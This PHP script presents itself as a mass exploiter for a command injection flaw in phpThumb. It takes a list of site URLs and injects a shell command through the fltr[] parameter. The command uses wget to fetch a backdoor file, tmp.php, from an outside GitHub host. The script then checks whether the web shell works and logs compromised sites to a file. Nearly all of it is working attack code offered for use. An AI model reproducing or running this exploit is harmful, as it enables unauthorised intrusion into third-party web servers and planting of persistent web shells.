<?php 
/*  phpThumb Command Injection Mass Exploiter
      D704T Hacker Team | Coded by NamiSec
 */
 error_reporting(0);
echo "\n";
echo "\e[0;34m#############################################\n";
echo "\e[0;34m#   \e[1;36mphpThumb Command Injection Mass Exploit \e[0;34m#\n";
echo "\e[0;34m#   \e[1;36mD704T Hacker Team                       \e[0;34m#\n";
echo "\e[0;34m#   \e[1;36mCoded by NamiSec                        \e[0;34m#\n";
echo "\e[0;34m#                                           #\n";
echo "\e[0;34m# \e[1;36mGithub : https://github.com/MantodKaz/    \e[0;34m#\n";
echo "\e[0;34m#############################################\n";
 echo "\n\e[1;37m Ex : http://site.com/[path to phpthumb]/phpthumb/\n\n\n";
   $pthumb = "\e[1;37m[\e[1;35mphpThumb\e[1;37m]";
 echo "$pthumb\n\e[1;36mList URL :\e[1;37m ";
$list = trim(fgets(STDIN));
$tum    = file_get_contents($list);
$site = explode("\n", $tum);

$i = 1;
foreach ($site as $sites) {
    echo "\e[1;36m[" . $i . " / " . count($site) . "]\n";$i++;
$dec = explode(PHP_EOL, $sites);foreach ($dec as $pron) {

foreach ($site as $url){
$url = trim($pron);
      $m = "\e[1;32mphpThumb.php found\n";
      $a = "\e[1;33mTry Upload Shell...\n";
      $n = "\e[1;32mUpload Success\n";
      $t = "\e[1;37mYour Access =>\e[1;32m $url/tmp.php?curl\e[1;37m\n[saved : thumbShell.txt]\n";
      $o = "\e[1;31mFailed Upload Shell\n=> $url\e[1;37m\n[saved : thumbDie.txt]\n";
      $manual = "\e[1;36m[ if under version 1.7.9 you can try to manual execute ! ]\n\n\e[1;37m";
      $d = "\e[1;31m[!] $url\nNotFound [!]\e[1;37m\n";
      }
}
    $cuk = curl_init();
   curl_setopt($cuk, CURLOPT_URL, $url."phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlace%20line%20fail.jpg%20jpeg:fail.jpg;wget%20-S%20https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/tmp.php;rm%20tmp.php.1;&phpThumbDebug=9");
    curl_setopt($cuk, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($cuk, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt ($cuk, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt ($cuk, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($cuk, CURLOPT_TIMEOUT, 10);
    $output = curl_exec($cuk);
        $duaratus = curl_getinfo($cuk, CURLINFO_HTTP_CODE);
    curl_close($cuk);
    if($duaratus == 200){
    	echo "$pthumb $m";
    sleep (0.3);
        echo "$pthumb $a";
        sleep (0.2);
      } else if ($duaratus == 404){
       	echo "$pthumb $d";
       }
         $cek = curl_init();
       curl_setopt($cek, CURLOPT_URL, $url."/tmp.php");
        curl_setopt($cek, CURLOPT_FOLLOWLOCATION, 1);
       curl_setopt($cek, CURLOPT_RETURNTRANSFER, 1);
       $ceek = curl_exec($cek);
       $ceeks = curl_getinfo($cek, CURLINFO_HTTP_CODE);
       if(preg_match("/xixixi/",$ceek) or $ceeks == 200){
           echo "$pthumb $n";
           sleep(0.1);
echo "$t";
$save = 'thumbShell.txt';
            $handle = fopen($save, 'a+') or die('Cannot open file:  '.$save);
            $data = $url."/tmp.php?kaz=curl";
            fwrite($handle, "\n".$data);
            fclose($handle);
 } if($ceeks == 404) {
 	echo "$pthumb $o";
 sleep (0.1);
 echo "$manual";
$fail = 'thumbDie.txt';
            $matek = fopen($fail, 'a+') or die('Cannot open file:  '.$fail);
            fwrite($matek, "\n".$url);
            fclose($matek);}}
